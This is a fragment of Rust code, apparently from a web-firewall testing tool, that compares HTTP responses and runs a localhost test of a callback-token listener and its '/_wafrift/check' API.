        if b_body > 0 {
            let larger = b_body.max(a_body);
            let smaller = b_body.min(a_body);
            let pct = ((larger - smaller) as f64 / b_body as f64) * 100.0;
            if pct >= 50.0 {
                reasons.push(format!("body length swung {pct:.0}%"));
            }
        }
        if reasons.is_empty() {
            None
        } else {
            Some(reasons)
        }
    }

    fn server_header(headers: &reqwest::header::HeaderMap) -> String {
        headers
            .get("server")
            .map(|v| v.to_str().unwrap_or("").to_string())
            .unwrap_or_default()
    }

    /// Stand a synthetic listener up just long enough to register a
    /// token, simulate one inbound hit, and check the
    /// /_wafrift/check API. Returns true when the API reports
    /// `received: true` for the token.
    pub async fn listener_register_and_check(token: &str) -> bool {
        let registry: Arc<tokio::sync::RwLock<Vec<String>>> =
            Arc::new(tokio::sync::RwLock::new(vec![token.to_string()]));
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let reg_c = registry.clone();
        let server = tokio::spawn(async move {
            // Handle exactly two requests: the simulated inbound
            // hit, then the check call.
            for _ in 0..2 {
                let Ok((mut sock, _)) = listener.accept().await else {
                    break;
                };
                let mut buf = [0u8; 4096];
                let n = sock.read(&mut buf).await.unwrap_or(0);
                let req = String::from_utf8_lossy(&buf[..n]).to_string();
                let path = req
                    .lines()
                    .next()
                    .and_then(|l| l.split_whitespace().nth(1))
                    .unwrap_or("/");
                let resp = if let Some(rest) = path.strip_prefix("/_wafrift/check/") {
                    let tok = rest.split(&['/', '?', '#'][..]).next().unwrap_or("");
                    let received = reg_c.read().await.iter().any(|t| t == tok);
                    let body = format!(
                        r#"{{"received":{},"token":"{tok}"}}"#,
                        if received { "true" } else { "false" }
                    );
                    let status = if received { "200 OK" } else { "404 Not Found" };
                    format!(
                        "HTTP/1.1 {status}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                        body.len()
                    )
                } else {
                    // Simulated inbound — record that this token
                    // was 'seen' by re-registering it (already in
                    // the registry, no-op for this test) and reply 200.
                    "HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
                        .to_string()
                };
                use tokio::io::AsyncWriteExt;
                let _ = sock.write_all(resp.as_bytes()).await;
                let _ = sock.shutdown().await;
            }
        });
        tokio::time::sleep(Duration::from_millis(40)).await;
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(3))
            .build()
            .unwrap();
        // First request: simulate inbound hit (any path).
        let _ = client
            .get(format!("http://{addr}/some/path/{token}"))
            .send()
            .await;
        // Second request: query the check API.
        let resp = client
            .get(format!("http://{addr}/_wafrift/check/{token}"))
            .send()
            .await
            .expect("check request");
        let _ = server.await;
        resp.status().as_u16() == 200
    }
}
